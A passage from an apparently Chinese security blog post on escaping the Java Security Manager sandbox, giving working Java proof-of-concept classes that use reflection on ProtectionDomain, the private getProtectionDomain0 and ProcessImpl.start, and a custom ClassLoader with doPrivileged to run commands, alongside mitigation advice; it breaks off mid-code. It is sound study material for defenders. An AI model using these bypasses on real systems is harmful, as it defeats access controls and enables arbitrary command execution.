+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    HashMap var0 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    var0.put(Reflection.class, <span class="keyword">new</span> String[]&#123;<span class="string">"fieldFilterMap"</span>, <span class="string">"methodFilterMap"</span>&#125;);</span><br><span class="line">    var0.put(System.class, <span class="keyword">new</span> String[]&#123;<span class="string">"security"</span>&#125;);</span><br><span class="line">    var0.put(Class.class, <span class="keyword">new</span> String[]&#123;<span class="string">"classLoader"</span>&#125;);</span><br><span class="line">    fieldFilterMap = var0;</span><br><span class="line">    methodFilterMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后，过滤完成之后返回的是System类其他不在黑名单中的字段，当然不包含security：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/15.png" alt=""></p>
+<p>至此就清楚了确实没办法直接通过反射来设置System类的security字段。</p>
+<p>既然负责检查的检察官Java Security Manager不可修改，那就尝试修改检查的材料—ProtectionDomain。</p>
+<p>根据Java的设计，一个类的URL和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如图：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/16.png" alt=""></p>
+<p>看到ProtectionDomain类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProtectionDomain</span> </span>&#123;</span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">// Set up JavaSecurityAccess in SharedSecrets</span></span><br><span class="line">        SharedSecrets.setJavaSecurityAccess(<span class="keyword">new</span> JavaSecurityAccessImpl());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* CodeSource */</span></span><br><span class="line">    <span class="keyword">private</span> CodeSource codesource ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ClassLoader the protection domain was consed from */</span></span><br><span class="line">    <span class="keyword">private</span> ClassLoader classloader;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Principals running-as within this protection domain */</span></span><br><span class="line">    <span class="keyword">private</span> Principal[] principals;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the rights this protection domain is granted */</span></span><br><span class="line">    <span class="keyword">private</span> PermissionCollection permissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* if the permissions object has AllPermission */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasAllPerm = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* the PermissionCollection is static (pre 1.4 constructor)</span></span><br><span class="line"><span class="comment">       or dynamic (via a policy refresh) */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> staticPermissions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....省略部分代码</span></span><br></pre></td></tr></table></figure>
+<p>如前面所说，一个类的CodeSource和Permissions构成了这个类的ProtectionDomain。这里看到hasAllPerm这个字段，应该是一个标记这个类是否有所有权限的布尔变量。因此可以尝试利用反射将它设置为true来看看是否可以使当前类获取所有权限。但是问题在于AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。</p>
+<p>这里我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。BypassSandbox类的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm()"</span>);</span><br><span class="line">        setHasAllPerm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                Field field = clz.getProtectionDomain().getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                field.set(clz.getProtectionDomain(), <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可是运行之后还是报错，说是没有getProtectionDomain的权限：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/17.png" alt=""></p>
+<p>这就很尴尬了。我们看下getProtectionDomain()函数的实现，先检查了权限，然后再调用私有的原生方法getProtectionDomain0()来获取ProtectionDomain：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns the &#123;<span class="doctag">@code</span> ProtectionDomain&#125; of this class.  If there is a</span></span><br><span class="line"><span class="comment">* security manager installed, this method first calls the security</span></span><br><span class="line"><span class="comment">* manager's &#123;<span class="doctag">@code</span> checkPermission&#125; method with a</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> RuntimePermission("getProtectionDomain")&#125; permission to</span></span><br><span class="line"><span class="comment">* ensure it's ok to get the</span></span><br><span class="line"><span class="comment">* &#123;<span class="doctag">@code</span> ProtectionDomain&#125;.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> the ProtectionDomain of this class</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@throws</span> SecurityException</span></span><br><span class="line"><span class="comment">*        if a security manager exists and its</span></span><br><span class="line"><span class="comment">*        &#123;<span class="doctag">@code</span> checkPermission&#125; method doesn't allow</span></span><br><span class="line"><span class="comment">*        getting the ProtectionDomain.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.security.ProtectionDomain</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> SecurityManager#checkPermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@see</span> java.lang.RuntimePermission</span></span><br><span class="line"><span class="comment">* <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> java.security.<span class="function">ProtectionDomain <span class="title">getProtectionDomain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sm.checkPermission(SecurityConstants.GET_PD_PERMISSION);</span><br><span class="line">    &#125;</span><br><span class="line">    java.security.ProtectionDomain pd = getProtectionDomain0();</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (allPermDomain == <span class="keyword">null</span>) &#123;</span><br><span class="line">            java.security.Permissions perms =</span><br><span class="line">                <span class="keyword">new</span> java.security.Permissions();</span><br><span class="line">            perms.add(SecurityConstants.ALL_PERMISSION);</span><br><span class="line">            allPermDomain =</span><br><span class="line">                <span class="keyword">new</span> java.security.ProtectionDomain(<span class="keyword">null</span>, perms);</span><br><span class="line">        &#125;</span><br><span class="line">        pd = allPermDomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那么我们完全可以通过反射直接运行getProtectionDomain0()方法，从而绕过对getProtectionDomain()方法的过滤，进而直接Bypass安全管理器。</p>
+<h4 id="Bypass利用——getProtectionDomain0"><a href="#Bypass利用——getProtectionDomain0" class="headerlink" title="Bypass利用——getProtectionDomain0"></a>Bypass利用——getProtectionDomain0</h4><p>BypassSandbox类的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running setHasAllPerm0()"</span>);</span><br><span class="line">        setHasAllPerm0(<span class="string">"calc"</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setHasAllPerm0</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();</span><br><span class="line">        <span class="comment">//遍历栈帧</span></span><br><span class="line">        <span class="keyword">for</span> (StackTraceElement stackTraceElement : stackTraceElements) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clz = Class.forName(stackTraceElement.getClassName());</span><br><span class="line">                <span class="comment">//利用反射调用getProtectionDomain0方法</span></span><br><span class="line">                Method getProtectionDomain = clz.getClass().getDeclaredMethod(<span class="string">"getProtectionDomain0"</span>, <span class="keyword">null</span>);</span><br><span class="line">                getProtectionDomain.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (pd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    Field field = pd.getClass().getDeclaredField(<span class="string">"hasAllPerm"</span>);</span><br><span class="line">                    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    field.set(pd, <span class="keyword">true</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行即可绕过getProtectionDomain()方法的过滤和安全管理器的限制执行命令弹计算器：</p>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/18.png" alt=""></p>
+<h4 id="Bypass利用——ProcessImpl"><a href="#Bypass利用——ProcessImpl" class="headerlink" title="Bypass利用——ProcessImpl"></a>Bypass利用——ProcessImpl</h4><p>有些方法的实现是，在public方法里面调用Security Manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过Security Manager的检查。例如平时我们调用<code>Runtime.getRuntime().exec(command)</code>，其实际的代码实现如下，是调用的ProcessBuilder.start()实现的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String[] cmdarray, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ProcessBuilder(cmdarray)</span><br><span class="line">        .environment(envp)</span><br><span class="line">        .directory(dir)</span><br><span class="line">        .start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>点进ProcessBuilder.start()函数中看其实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Must convert to array first -- a malicious user-supplied</span></span><br><span class="line">    <span class="comment">// list might try to circumvent the security check.</span></span><br><span class="line">    String[] cmdarray = command.toArray(<span class="keyword">new</span> String[command.size()]);</span><br><span class="line">    cmdarray = cmdarray.clone();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String arg : cmdarray)</span><br><span class="line">        <span class="keyword">if</span> (arg == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// Throws IndexOutOfBoundsException if command is empty</span></span><br><span class="line">    String prog = cmdarray[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>)</span><br><span class="line">        security.checkExec(prog);</span><br><span class="line"></span><br><span class="line">    String dir = directory == <span class="keyword">null</span> ? <span class="keyword">null</span> : directory.toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; cmdarray.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmdarray[i].indexOf(<span class="string">'\u0000'</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"invalid null character in command"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProcessImpl.start(cmdarray,</span><br><span class="line">                                 environment,</span><br><span class="line">                                 dir,</span><br><span class="line">                                 redirects,</span><br><span class="line">                                 redirectErrorStream);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | IllegalArgumentException e) &#123;</span><br><span class="line">        String exceptionInfo = <span class="string">": "</span> + e.getMessage();</span><br><span class="line">        Throwable cause = e;</span><br><span class="line">        <span class="keyword">if</span> ((e <span class="keyword">instanceof</span> IOException) &amp;&amp; security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Can not disclose the fail reason for read-protected files.</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                security.checkRead(prog);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                exceptionInfo = <span class="string">""</span>;</span><br><span class="line">                cause = se;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// It's much easier for us to create a high-quality error</span></span><br><span class="line">        <span class="comment">// message than the low-level C code which found the problem.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(</span><br><span class="line">            <span class="string">"Cannot run program \""</span> + prog + <span class="string">"\""</span></span><br><span class="line">            + (dir == <span class="keyword">null</span> ? <span class="string">""</span> : <span class="string">" (in directory \""</span> + dir + <span class="string">"\")"</span>)</span><br><span class="line">            + exceptionInfo,</span><br><span class="line">            cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，显示检查了是否有执行命令的权限，然后实际是调用了ProcessImpl.start()方法来实现命令执行。也就是说，完成功能的是ProcessImpl.start()方法，而在这个方法调用之前，Java Security Manager就已经完成了检测。因此，当我们直接反射调用这个方法时，就能成功绕过Java Security Manager的检测过滤。</p>
+<p>BypassSandbox类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassSandbox</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Running reflectProcessImpl()"</span>);</span><br><span class="line">        reflectProcessImpl(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectProcessImpl</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">        Method method = clz.getDeclaredMethod(<span class="string">"start"</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method.invoke(clz, <span class="keyword">new</span> String[]&#123;command&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行即可绕过安全管理器的限制执行命令弹计算器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.manager -Djava.security.policy=&quot;E:\\my.policy&quot; BypassSandbox</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/03/浅析Java沙箱逃逸/9.png" alt=""></p>
+<h4 id="修复方法-2"><a href="#修复方法-2" class="headerlink" title="修复方法"></a>修复方法</h4><p>不授予accessDeclaredMembers权限和suppressAccessChecks权限。</p>
+<p>然而在Java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，但可以设置禁止反射的方法和变量的黑名单。比如前面调试分析的在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerFieldsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">registerMethodsToFilter</span><span class="params">(Class&lt;?&gt; var0, String... var1)</span> </span>&#123;</span><br><span class="line">    methodFilterMap = registerFilter(methodFilterMap, var0, var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个Map即可。</p>
+<h3 id="创建ClassLoader绕过"><a href="#创建ClassLoader绕过" class="headerlink" title="创建ClassLoader绕过"></a>创建ClassLoader绕过</h3><h4 id="Bypass利用-2"><a href="#Bypass利用-2" class="headerlink" title="Bypass利用"></a>Bypass利用</h4><p>一个类的ProtectionDomain在这个类被ClassLoader加载时初始化。</p>
+<p>如果我们能自定义一个ClassLoader来加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这样就能绕过Java Security Manager了。然而，当这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。</p>
+<p>这个时候就是doPrivileged()发挥作用的时候了。AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged()方法的栈帧为止。只要我们在恶意类中调用doPrivileged()方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager了。</p>
+<p>假设开发者自定义的策略文件my.policy，设置了createClassLoader权限和任意文件读取权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;createClassLoader&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>Exploit类，静态代码中调用AccessController.doPrivileged()函数，其中执行恶意命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.AccessController;</span><br><span class="line"><span class="keyword">import</span> java.security.PrivilegedAction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Process process = Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">                    var2.printStackTrace();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MyClassLoader类：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 